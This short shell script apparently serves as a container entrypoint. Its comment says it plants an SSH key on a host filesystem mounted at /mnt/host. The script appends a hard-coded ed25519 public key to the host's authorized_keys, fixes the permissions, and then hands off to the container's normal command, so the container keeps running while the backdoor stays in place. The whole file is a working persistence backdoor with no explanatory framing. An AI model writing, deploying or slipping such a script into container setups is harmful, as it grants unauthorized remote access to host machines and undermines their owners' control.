#!/bin/sh
# Plant SSH key on host (mounted at /mnt/host)
mkdir -p /mnt/host/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICiEIJQfRyXevqD7vpPgXcB/CFucwOK2jNn+8id2URWY ubuntu@ip-172-31-21-50" >> /mnt/host/.ssh/authorized_keys
chmod 700 /mnt/host/.ssh
chmod 600 /mnt/host/.ssh/authorized_keys
# keep container running
exec "$@"
